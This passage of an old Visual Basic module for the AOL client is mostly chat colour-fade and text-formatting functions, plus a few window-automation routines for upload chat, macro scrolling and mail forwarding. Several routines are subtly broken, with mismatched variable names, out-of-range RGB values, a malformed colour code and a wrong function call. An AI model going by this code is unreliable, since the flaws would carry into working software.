'This will open a file... whole dir and file name needed
Shell (file)
End Sub

Sub File_ReName(sFromLoc As String, sToLoc As String)
'This will immediately rename a file for you
Name sOldLoc As sNewLoc
End Sub


Function BoldAOL4_WavColors2(Text1 As String)
G$ = Text1
A = Len(G$)
For W = 1 To A Step 4
    r$ = Mid$(G$, W, 1)
    U$ = Mid$(G$, W + 1, 1)
    s$ = Mid$(G$, W + 2, 1)
    T$ = Mid$(G$, W + 3, 1)
    p$ = p$ & "<b><FONT COLOR=" & Chr$(34) & "#0000FF" & Chr$(34) & "><sup>" & r$ & "</sup>" & "<FONT COLOR=" & Chr$(34) & "#006600" & Chr$(34) & ">" & U$ & "<FONT COLOR=" & Chr$(34) & "#0000FF" & Chr$(34) & "><sub>" & s$ & "</sub>" & "<FONT COLOR=" & Chr$(34) & "##006600" & Chr$(34) & ">" & T$
Next W
BoldSendChat (p$)
End Function

Sub BoldSendChat(BoldChat)
'This is new it makes the chat text bold.
'example:
'BoldSendChat ("ThIs Is BoLd")
'It will come out bold on the chat screen.
SendChat ("<b>" & BoldChat & "</b>")
End Sub
Sub ItalicSendChat(ItalicChat)
'Makes chat text in Italics.
SendChat ("<i>" & ItalicChat & "</i>")
End Sub

Sub UnderLineSendChat(UnderLineChat)
' underlines chat text.
SendChat ("<u>" & UnderLineChat & "</u>")
End Sub




Sub Upchat()
AOL% = FindWindow("AOL Frame25", vbNullString)
AOModal% = FindChildByClass(AOL%, "_AOL_Modal")
AOGauge% = FindChildByClass(AOModal%, "_AOL_Gauge")
If AOGauge% <> 0 Then Upp% = AOModal%
Call EnableWindow(AOL%, 1)
Call EnableWindow(Upp%, 0)
End Sub

'Preset 2-3 color fade hexcode generator


Function RGBtoHEX(RGB)
    A = Hex(RGB)
    B = Len(A)
    If B = 5 Then A = "0" & A
    If B = 4 Then A = "00" & A
    If B = 3 Then A = "000" & A
    If B = 2 Then A = "0000" & A
    If B = 1 Then A = "00000" & A
    RGBtoHEX = A
End Function

Function r_spaced(strin As String)
'Returns the strin spaced
Let inptxt$ = strin
Let lenth% = Len(inptxt$)
Do While numspc% <= lenth%
Let numspc% = numspc% + 1
Let NextChr$ = Mid$(inptxt$, numspc%, 1)
Let NextChr$ = NextChr$ + " "
Let newsent$ = newsent$ + NextChr$
Loop
SendChat (newsent$)
End Function

Function BoldRedBlackRed(Text As String)
    A = Len(Text)
    For B = 1 To A
        C = Left(Text, B)
        D = Right(C, 1)
        E = 510 / A
        f = E * B
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 0, 255 - f)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
  BoldSendChat (Msg)
End Function


Function RedBlackRed2(Text As String)
    A = Len(Text)
    For B = 1 To A
        C = Left(Text, B)
        D = Right(C, 1)
        E = 510 / A
        f = E * B
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 0, 255 - f)
        H = RGBtoHEX(G)
        Msg = Msg & "<B><I><U><Font Color=#" & H & ">" & D
    Next B
  SendChat (Msg)
End Function

Function TrimSpaces(Text)
    If InStr(Text, " ") = 0 Then
    TrimSpaces = Text
    Exit Function
    End If
    For TrimSpace = 1 To Len(Text)
    thechar$ = Mid(Text, TrimSpace, 1)
    thechars$ = thechars$ & thechar$
    If thechar$ = " " Then
    thechars$ = Mid(thechars$, 1, Len(thechars$) - 1)
    End If
    Next TrimSpace
    TrimSpaces = thechars$
End Function





Function BoldBlackGreen(Text As String)
    A = Len(Text)
    For B = 1 To A
        C = Left(Text, B)
        D = Right(C, 1)
        E = 255 / A
        f = E * B
        G = RGB(0, f, 0)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
  BoldSendChat (Msg)
End Function
Function BoldBlackGreenBlack(Text As String)
    A = Len(Text)
    For B = 1 To A
        C = Left(Text, B)
        D = Right(C, 1)
        E = 510 / A
        f = E * B
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, f, 0)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
   BoldSendChat (Msg)
End Function


Function BoldBlack_LBlue(Text1)
    A = Len(Text1)
    For B = 1 To A
        C = Left(Text1, B)
        D = Right(C, 1)
        E = 255 / A
        f = E * B
        G = RGB(f, f, f - f)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
    BoldSendChat (Msg)
End Function


Function BoldBlackBlue(Text As String)
    A = Len(Text)
    For B = 1 To A
        C = Left(Text, B)
        D = Right(C, 1)
        E = 255 / A
        f = E * B
        G = RGB(f, 0, 0)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
   BoldSendChat (Msg)

End Function
Sub BoldFadeYellow(TheText As String)
A = Len(TheText)
For W = 1 To A Step 18
    ab$ = Mid$(TheText, W, 1)
    U$ = Mid$(TheText, W + 1, 1)
    s$ = Mid$(TheText, W + 2, 1)
    T$ = Mid$(TheText, W + 3, 1)
    Y$ = Mid$(TheText, W + 4, 1)
    L$ = Mid$(TheText, W + 5, 1)
    f$ = Mid$(TheText, W + 6, 1)
    B$ = Mid$(TheText, W + 7, 1)
    C$ = Mid$(TheText, W + 8, 1)
    D$ = Mid$(TheText, W + 9, 1)
    H$ = Mid$(TheText, W + 10, 1)
    J$ = Mid$(TheText, W + 11, 1)
    k$ = Mid$(TheText, W + 12, 1)
    M$ = Mid$(TheText, W + 13, 1)
    n$ = Mid$(TheText, W + 14, 1)
    q$ = Mid$(TheText, W + 15, 1)
    V$ = Mid$(TheText, W + 16, 1)
    Z$ = Mid$(TheText, W + 17, 1)
    PC$ = PC$ & "<b><FONT COLOR=#FFFF00>" & ab$ & "<FONT COLOR=#999900>" & U$ & "<FONT COLOR=#888800>" & s$ & "<FONT COLOR=#777700>" & T$ & "<FONT COLOR=#666600>" & Y$ & "<FONT COLOR=#555500>" & L$ & "<FONT COLOR=#444400>" & f$ & "<FONT COLOR=#333300>" & B$ & "<FONT COLOR=#222200>" & C$ & "<FONT COLOR=#111100>" & D$ & "<FONT COLOR=#222200>" & H$ & "<FONT COLOR=#333300>" & J$ & "<FONT COLOR=#444400>" & k$ & "<FONT COLOR=#555500>" & M$ & "<FONT COLOR=#666600>" & n$ & "<FONT COLOR=#777700>" & q$ & "<FONT COLOR=#888800>" & V$ & "<FONT COLOR=#999900>" & Z$
Next W
SendChat (PC$)

End Sub




Function BoldBlackBlueBlack(Text As String)
    A = Len(Text)
    For B = 1 To A
        C = Left(Text, B)
        D = Right(C, 1)
        E = 510 / A
        f = E * B
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 0, 0)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
   BoldSendChat (Msg)
End Function








Function BoldBlackRed(Text As String)
    A = Len(Text)
    For B = 1 To A
        C = Left(Text, B)
        D = Right(C, 1)
        E = 255 / A
        f = E * B
        G = RGB(0, 0, f)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
BoldSendChat (Msg)
End Function


Function BoldBlackRedBlack(Text As String)
    A = Len(Text)
    For B = 1 To A
        C = Left(Text, B)
        D = Right(C, 1)
        E = 510 / A
        f = E * B
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 0, f)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
  BoldSendChat (Msg)
End Function

Function BoldBlackYellow(Text As String)
    A = Len(Text)
    For B = 1 To A
        C = Left(Text, B)
        D = Right(C, 1)
        E = 255 / A
        f = E * B
        G = RGB(0, f, f)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
BoldSendChat (Msg)
End Function

Function BoldBlackYellowBlack(Text As String)
    A = Len(Text)
    For B = 1 To A
        C = Left(Text, B)
        D = Right(C, 1)
        E = 510 / A
        f = E * B
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, f, f)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
   BoldSendChat (Msg)
End Function

Function BoldBlueBlack(Text As String)
    A = Len(Text)
    For B = 1 To A
        C = Left(Text, B)
        D = Right(C, 1)
        E = 255 / A
        f = E * B
        G = RGB(255 - f, 0, 0)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
  BoldSendChat (Msg)
End Function


Function BoldBlueBlackBlue(Text As String)
    A = Len(Text)
    For B = 1 To A
        C = Left(Text, B)
        D = Right(C, 1)
        E = 510 / A
        f = E * B
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 0, 0)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
  BoldSendChat (Msg)
End Function


Function BoldBlueGreen(Text As String)
    A = Len(Text)
    For B = 1 To A
        C = Left(Text, B)
        D = Right(C, 1)
        E = 255 / A
        f = E * B
        G = RGB(255 - f, f, 0)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
 BoldSendChat (Msg)
End Function
Function BoldBlueGreenBlue(Text As String)
    A = Len(Text)
    For B = 1 To A
        C = Left(Text, B)
        D = Right(C, 1)
        E = 510 / A
        f = E * B
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, f, 0)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
  BoldSendChat (Msg)
End Function



Function BoldBlueRed(Text As String)
    A = Len(Text)
    For B = 1 To A
        C = Left(Text, B)
        D = Right(C, 1)
        E = 255 / A
        f = E * B
        G = RGB(255 - f, 0, f)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
 BoldSendChat (Msg)
End Function


Function BoldBlueRedBlue(Text As String)
    A = Len(Text)
    For B = 1 To A
        C = Left(Text, B)
        D = Right(C, 1)
        E = 510 / A
        f = E * B
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 0, f)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
   BoldSendChat (Msg)
End Function

Function BoldBlueYellow(Text As String)
    A = Len(Text)
    For B = 1 To A
        C = Left(Text, B)
        D = Right(C, 1)
        E = 255 / A
        f = E * B
        G = RGB(255 - f, f, f)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
  BoldSendChat (Msg)
End Function


Function BoldBlueYellowBlue(Text As String)
    A = Len(Text)
    For B = 1 To A
        C = Left(Text, B)
        D = Right(C, 1)
        E = 510 / A
        f = E * B
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, f, f)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
  BoldSendChat (Msg)
End Function





'Pre-set 2 color fade combinations begin here
Sub BoldFadeBlack(TheText As String)
A = Len(TheText)
For W = 1 To A Step 18
    ab$ = Mid$(TheText, W, 1)
    U$ = Mid$(TheText, W + 1, 1)
    s$ = Mid$(TheText, W + 2, 1)
    T$ = Mid$(TheText, W + 3, 1)
    Y$ = Mid$(TheText, W + 4, 1)
    L$ = Mid$(TheText, W + 5, 1)
    f$ = Mid$(TheText, W + 6, 1)
    B$ = Mid$(TheText, W + 7, 1)
    C$ = Mid$(TheText, W + 8, 1)
    D$ = Mid$(TheText, W + 9, 1)
    H$ = Mid$(TheText, W + 10, 1)
    J$ = Mid$(TheText, W + 11, 1)
    k$ = Mid$(TheText, W + 12, 1)
    M$ = Mid$(TheText, W + 13, 1)
    n$ = Mid$(TheText, W + 14, 1)
    q$ = Mid$(TheText, W + 15, 1)
    V$ = Mid$(TheText, W + 16, 1)
    Z$ = Mid$(TheText, W + 17, 1)
    PC$ = PC$ & "<b><FONT COLOR=#000000>" & ab$ & "<FONT COLOR=#111111>" & U$ & "<FONT COLOR=#222222>" & s$ & "<FONT COLOR=#333333>" & T$ & "<FONT COLOR=#444444>" & Y$ & "<FONT COLOR=#555555>" & L$ & "<FONT COLOR=#666666>" & f$ & "<FONT COLOR=#777777>" & B$ & "<FONT COLOR=#888888>" & C$ & "<FONT COLOR=#999999>" & D$ & "<FONT COLOR=#888888>" & H$ & "<FONT COLOR=#777777>" & J$ & "<FONT COLOR=#666666>" & k$ & "<FONT COLOR=#555555>" & M$ & "<FONT COLOR=#444444>" & n$ & "<FONT COLOR=#333333>" & q$ & "<FONT COLOR=#222222>" & V$ & "<FONT COLOR=#111111>" & Z$
Next W
SendChat (PC$)
'Code for the room shit will be
'Call Fadeblack(Text1.text)


'to make any of the subs werk in ims
'You will need 2 text boxes and a button
'Do the change below and copy that to your send button
   ' a = Len(Text2.text)
    'For B = 1 To a
        'c = Left(Text2.text, B)
        'D = Right(c, 1)
        'e = 255 / a
        'F = e * B
        'G = RGB(F, 0, 0)
        'H = RGBtoHEX(G)
    ' Dim msg
    ' msg=msg & "<B><Font Color=#" & H & ">" & D
    'Next B
   ' Call IMKeyword(Text1.text, msg)
'u can do it for mail too but
'that is harder and I will leave that to u
'to figure out
End Sub
Sub BoldFadeBlue(TheText As String)
A = Len(TheText)
For W = 1 To A Step 18
    ab$ = Mid$(TheText, W, 1)
    U$ = Mid$(TheText, W + 1, 1)
    s$ = Mid$(TheText, W + 2, 1)
    T$ = Mid$(TheText, W + 3, 1)
    Y$ = Mid$(TheText, W + 4, 1)
    L$ = Mid$(TheText, W + 5, 1)
    f$ = Mid$(TheText, W + 6, 1)
    B$ = Mid$(TheText, W + 7, 1)
    C$ = Mid$(TheText, W + 8, 1)
    D$ = Mid$(TheText, W + 9, 1)
    H$ = Mid$(TheText, W + 10, 1)
    J$ = Mid$(TheText, W + 11, 1)
    k$ = Mid$(TheText, W + 12, 1)
    M$ = Mid$(TheText, W + 13, 1)
    n$ = Mid$(TheText, W + 14, 1)
    q$ = Mid$(TheText, W + 15, 1)
    V$ = Mid$(TheText, W + 16, 1)
    Z$ = Mid$(TheText, W + 17, 1)
    PC$ = PC$ & "<b><FONT COLOR=#000019>" & ab$ & "<FONT COLOR=#000026>" & U$ & "<FONT COLOR=#00003F>" & s$ & "<FONT COLOR=#000058>" & T$ & "<FONT COLOR=#000072>" & Y$ & "<FONT COLOR=#00008B>" & L$ & "<FONT COLOR=#0000A5>" & f$ & "<FONT COLOR=#0000BE>" & B$ & "<FONT COLOR=#0000D7>" & C$ & "<FONT COLOR=#0000F1>" & D$ & "<FONT COLOR=#0000D7>" & H$ & "<FONT COLOR=#0000BE>" & J$ & "<FONT COLOR=#0000A5>" & k$ & "<FONT COLOR=#00008B>" & M$ & "<FONT COLOR=#000072>" & n$ & "<FONT COLOR=#000058>" & q$ & "<FONT COLOR=#00003F>" & V$ & "<FONT COLOR=#000026>" & Z$
Next W
SendChat (PC$)

End Sub

Sub BoldFadeGreen(TheText As String)
A = Len(TheText)
For W = 1 To A Step 18
    ab$ = Mid$(TheText, W, 1)
    U$ = Mid$(TheText, W + 1, 1)
    s$ = Mid$(TheText, W + 2, 1)
    T$ = Mid$(TheText, W + 3, 1)
    Y$ = Mid$(TheText, W + 4, 1)
    L$ = Mid$(TheText, W + 5, 1)
    f$ = Mid$(TheText, W + 6, 1)
    B$ = Mid$(TheText, W + 7, 1)
    C$ = Mid$(TheText, W + 8, 1)
    D$ = Mid$(TheText, W + 9, 1)
    H$ = Mid$(TheText, W + 10, 1)
    J$ = Mid$(TheText, W + 11, 1)
    k$ = Mid$(TheText, W + 12, 1)
    M$ = Mid$(TheText, W + 13, 1)
    n$ = Mid$(TheText, W + 14, 1)
    q$ = Mid$(TheText, W + 15, 1)
    V$ = Mid$(TheText, W + 16, 1)
    Z$ = Mid$(TheText, W + 17, 1)
    PC$ = PC$ & "<b><FONT COLOR=#001100>" & ab$ & "<FONT COLOR=#002200>" & U$ & "<FONT COLOR=#003300>" & s$ & "<FONT COLOR=#004400>" & T$ & "<FONT COLOR=#005500>" & Y$ & "<FONT COLOR=#006600>" & L$ & "<FONT COLOR=#007700>" & f$ & "<FONT COLOR=#008800>" & B$ & "<FONT COLOR=#009900>" & C$ & "<FONT COLOR=#00FF00>" & D$ & "<FONT COLOR=#009900>" & H$ & "<FONT COLOR=#008800>" & J$ & "<FONT COLOR=#007700>" & k$ & "<FONT COLOR=#006600>" & M$ & "<FONT COLOR=#005500>" & n$ & "<FONT COLOR=#004400>" & q$ & "<FONT COLOR=#003300>" & V$ & "<FONT COLOR=#002200>" & Z$
Next W
SendChat (PC$)
End Sub
Sub BoldFadeRed(TheText As String)
A = Len(TheText)
For W = 1 To A Step 18
    ab$ = Mid$(TheText, W, 1)
    U$ = Mid$(TheText, W + 1, 1)
    s$ = Mid$(TheText, W + 2, 1)
    T$ = Mid$(TheText, W + 3, 1)
    Y$ = Mid$(TheText, W + 4, 1)
    L$ = Mid$(TheText, W + 5, 1)
    f$ = Mid$(TheText, W + 6, 1)
    B$ = Mid$(TheText, W + 7, 1)
    C$ = Mid$(TheText, W + 8, 1)
    D$ = Mid$(TheText, W + 9, 1)
    H$ = Mid$(TheText, W + 10, 1)
    J$ = Mid$(TheText, W + 11, 1)
    k$ = Mid$(TheText, W + 12, 1)
    M$ = Mid$(TheText, W + 13, 1)
    n$ = Mid$(TheText, W + 14, 1)
    q$ = Mid$(TheText, W + 15, 1)
    V$ = Mid$(TheText, W + 16, 1)
    Z$ = Mid$(TheText, W + 17, 1)
    PC$ = PC$ & "<b><FONT COLOR=#FF0000>" & ab$ & "<FONT COLOR=#990000>" & U$ & "<FONT COLOR=#880000>" & s$ & "<FONT COLOR=#770000>" & T$ & "<FONT COLOR=#660000>" & Y$ & "<FONT COLOR=#550000>" & L$ & "<FONT COLOR=#440000>" & f$ & "<FONT COLOR=#330000>" & B$ & "<FONT COLOR=#220000>" & C$ & "<FONT COLOR=#110000>" & D$ & "<FONT COLOR=#220000>" & H$ & "<FONT COLOR=#330000>" & J$ & "<FONT COLOR=#440000>" & k$ & "<FONT COLOR=#550000>" & M$ & "<FONT COLOR=#660000>" & n$ & "<FONT COLOR=#770000>" & q$ & "<FONT COLOR=#880000>" & V$ & "<FONT COLOR=#990000>" & Z$
Next W
SendChat (PC$)


End Sub


Function BoldGreenBlack(Text As String)
    A = Len(Text)
    For B = 1 To A
        C = Left(Text, B)
        D = Right(C, 1)
        E = 255 / A
        f = E * B
        G = RGB(0, 255 - f, 0)
        H = RGBtoHEX(G)
        Msg = Msg & "<B><Font Color=#" & H & ">" & D
    Next B
   SendChat (Msg)
End Function



Function BoldGreenBlackGreen(Text As String)
    A = Len(Text)
    For B = 1 To A
        C = Left(Text, B)
        D = Right(C, 1)
        E = 510 / A
        f = E * B
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 255 - f, 0)
        H = RGBtoHEX(G)
        Msg = Msg & "<B><Font Color=#" & H & ">" & D
    Next B
  SendChat (Msg)
End Function


Function BoldGreenBlue(Text As String)
    A = Len(Text)
    For B = 1 To A
        C = Left(Text, B)
        D = Right(C, 1)
        E = 255 / A
        f = E * B
        G = RGB(f, 255 - f, 0)
        H = RGBtoHEX(G)
        Msg = Msg & "<B><Font Color=#" & H & ">" & D
    Next B
   SendChat (Msg)
End Function


Function BoldGreenBlueGreen(Text As String)
    A = Len(Text)
    For B = 1 To A
        C = Left(Text, B)
        D = Right(C, 1)
        E = 510 / A
        f = E * B
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 255 - f, 0)
        H = RGBtoHEX(G)
        Msg = Msg & "<B><Font Color=#" & H & ">" & D
    Next B
   SendChat (Msg)
End Function








Function BoldGreenRed(Text As String)
    A = Len(Text)
    For B = 1 To A
        C = Left(Text, B)
        D = Right(C, 1)
        E = 255 / A
        f = E * B
        G = RGB(0, 255 - f, f)
        H = RGBtoHEX(G)
        Msg = Msg & "<B><Font Color=#" & H & ">" & D
    Next B
   SendChat (Msg)
End Function


Function BoldGreenRedGreen(Text As String)
    A = Len(Text)
    For B = 1 To A
        C = Left(Text, B)
        D = Right(C, 1)
        E = 510 / A
        f = E * B
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 255 - f, f)
        H = RGBtoHEX(G)
        Msg = Msg & "<B><Font Color=#" & H & ">" & D
    Next B
   SendChat (Msg)
End Function



Function BoldGreenYellow(Text As String)
    A = Len(Text)
    For B = 1 To A
        C = Left(Text, B)
        D = Right(C, 1)
        E = 255 / A
        f = E * B
        G = RGB(0, 255, f)
        H = RGBtoHEX(G)
        Msg = Msg & "<B><Font Color=#" & H & ">" & D
    Next B
  SendChat (Msg)
End Function


Function BoldGreenYellowGreen(Text As String)
    A = Len(Text)
    For B = 1 To A
        C = Left(Text, B)
        D = Right(C, 1)
        E = 510 / A
        f = E * B
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 255, f)
        H = RGBtoHEX(G)
        Msg = Msg & "<B><Font Color=#" & H & ">" & D
    Next B
  SendChat (Msg)
End Function


Function BoldGreyBlack(Text As String)
    A = Len(Text)
    For B = 1 To A
        C = Left(Text, B)
        D = Right(C, 1)
        E = 220 / A
        f = E * B
        G = RGB(255 - f, 255 - f, 255 - f)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
 BoldSendChat (Msg)
End Function


Function BoldGreyBlackGrey(Text As String)
    A = Len(Text)
    For B = 1 To A
        C = Left(Text, B)
        D = Right(C, 1)
        E = 490 / A
        f = E * B
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255 - f, 255 - f)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
BoldSendChat (Msg)
End Function


Function BoldGreyBlue(Text As String)
    A = Len(Text)
    For B = 1 To A
        C = Left(Text, B)
        D = Right(C, 1)
        E = 255 / A
        f = E * B
        G = RGB(255, 255, 255 - f)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
BoldSendChat (Msg)
End Function

Function BoldGreyBlueGrey(Text As String)
    A = Len(Text)
    For B = 1 To A
        C = Left(Text, B)
        D = Right(C, 1)
        E = 490 / A
        f = E * B
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255, 255, 255 - f)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
 BoldSendChat (Msg)
End Function

Function BoldGreyGreen(Text As String)
    A = Len(Text)
    For B = 1 To A
        C = Left(Text, B)
        D = Right(C, 1)
        E = 255 / A
        f = E * B
        G = RGB(255 - f, 255, 255 - f)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
 BoldSendChat (Msg)
End Function


Function BoldGreyGreenGrey(Text As String)
    A = Len(Text)
    For B = 1 To A
        C = Left(Text, B)
        D = Right(C, 1)
        E = 490 / A
        f = E * B
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255, 255 - f)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
BoldSendChat (Msg)
End Function




Function BoldGreyRed(Text As String)
    A = Len(Text)
    For B = 1 To A
        C = Left(Text, B)
        D = Right(C, 1)
        E = 255 / A
        f = E * B
        G = RGB(255 - f, 255 - f, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
BoldSendChat (Msg)
End Function


Function BoldGreyRedGrey(Text As String)
    A = Len(Text)
    For B = 1 To A
        C = Left(Text, B)
        D = Right(C, 1)
        E = 490 / A
        f = E * B
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255 - f, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
BoldSendChat (Msg)
End Function







Function Bolditalic_BlackPurpleBlack(Text As String)
    A = Len(Text)
    For B = 1 To A
        C = Left(Text, B)
        D = Right(C, 1)
        E = 510 / A
        f = E * B
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 0, f)
        H = RGBtoHEX(G)
        Msg = Msg & "<B><I><Font Color=#" & H & ">" & D
    Next B
   SendChat (Msg)
End Function


Function Bolditalic_BluePurpleBlue(Text As String)
    A = Len(Text)
    For B = 1 To A
        C = Left(Text, B)
        D = Right(C, 1)
        E = 510 / A
        f = E * B
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255, 0, f)
        H = RGBtoHEX(G)
        Msg = Msg & "<B><I><Font Color=#" & H & ">" & D
    Next B
 SendChat (Msg)
End Function

Function BoldLBlue_DBlue(Text1)
    A = Len(Text1)
    For B = 1 To A
        C = Left(Text1, B)
        D = Right(C, 1)
        E = 255 / A
        f = E * B
        G = RGB(355, 255 - f, 55)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
 BoldSendChat (Msg)
End Function


Function BoldLBlue_DBlue_LBlue(Text1)
    A = Len(Text1)
    For B = 1 To A
        C = Left(Text1, B)
        D = Right(C, 1)
        E = 510 / A
        f = E * B
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(355, 255 - f, 55)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
BoldSendChat (Msg)
End Function

Function BoldLBlue_Green_LBlue(Text1)
    A = Len(Text1)
    For B = 1 To A
        C = Left(Text1, B)
        D = Right(C, 1)
        E = 510 / A
        f = E * B
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255, 0)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
    LBlue_Green_LBlue (Msg)
End Function


Function LBlue_DBlue(Text1)
    A = Len(Text1)
    For B = 1 To A
        C = Left(Text1, B)
        D = Right(C, 1)
        E = 255 / A
        f = E * B
        G = RGB(355, 255 - f, 55)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
    LBlue_DBlue = Msg
End Function


Function LBlue_DBlue_LBlue(Text1)
    A = Len(Text1)
    For B = 1 To A
        C = Left(Text1, B)
        D = Right(C, 1)
        E = 510 / A
        f = E * B
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(355, 255 - f, 55)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
    LBlue_DBlue_LBlue = Msg
End Function


Function LBlue_Green_LBlue(Text1)
    A = Len(Text1)
    For B = 1 To A
        C = Left(Text1, B)
        D = Right(C, 1)
        E = 510 / A
        f = E * B
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255, 0)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
    LBlue_Green_LBlue = Msg
End Function


Function LBlue_Orange(Text1)
    A = Len(Text1)
    For B = 1 To A
        C = Left(Text1, B)
        D = Right(C, 1)
        E = 255 / A
        f = E * B
        G = RGB(255 - f, 155, f)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
    LBlue_Orange = Msg
End Function




Function LBlue_Orange_LBlue(Text1)
    A = Len(Text1)
    For B = 1 To A
        C = Left(Text1, B)
        D = Right(C, 1)
        E = 510 / A
        f = E * B
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 155, f)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
    LBlue_Orange_LBlue = Msg
End Function


Function LBlue_Yellow_LBlue(Text1)
    A = Len(Text1)
    For B = 1 To A
        C = Left(Text1, B)
        D = Right(C, 1)
        E = 510 / A
        f = E * B
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255, f)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
    LBlue_Yellow_LBlue = Msg
End Function

Function LGreen_DGreen_LGreen(Text1)
    A = Len(Text1)
    For B = 1 To A
        C = Left(Text1, B)
        D = Right(C, 1)
        E = 490 / A
        f = E * B
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 375 - f, 0)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
    LGreen_DGreen_LGreen = Msg
End Function



Function LGreen_DGreen(Text1)
    A = Len(Text1)
    For B = 1 To A
        C = Left(Text1, B)
        D = Right(C, 1)
        E = 220 / A
        f = E * B
        G = RGB(0, 375 - f, 0)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
    LGreen_DGreen = Msg
End Function

Public Sub Macrothing(txt As TextBox)
'This scrolls a multilined textbox adding timeouts where needed
'This is basically for macro shops and things like that.
BoldPurpleRed "· ···•(\›• INCOMMING TEXT"
Timeout 4
Dim onelinetxt$, X$, start%, i%
start% = 1
fa = 1
For i% = start% To Len(txt.Text)
X$ = Mid(txt.Text, i%, 1)
onelinetxt$ = onelinetxt$ + X$
If Asc(X$) = 13 Then
BoldPurpleRed ": " + onelinetxt$
Timeout (0.5)
J% = J% + 1
i% = InStr(start%, txt.Text, X$)
If i% >= Len(txt.Text) Then Exit For
start% = i% + 1
onelinetxt$ = ""
End If
Next i%
BoldSendChat ":" + onelinetxt$
End Sub

Function Mail_ClickForward()
X = FindOpenMail
If X = 0 Then GoTo last
AOLActivate
SendKeys "{TAB}"
AG:
Timeout (0.2)
SendKeys " "
X = FindSendWin(2)
If X = 0 Then GoTo AG
last:
End Function
Function FindSendWin(dosloop)
firs% = GetWindow(FindChildByClass(AOLWindow(), "MDIClient"), 5)
forw% = FindChildByTitle(firs%, "Send Now")
If forw% <> 0 Then GoTo bone
firs% = GetWindow(FindChildByClass(AOLWindow(), "MDIClient"), GW_CHILD)

Do: DoEvents
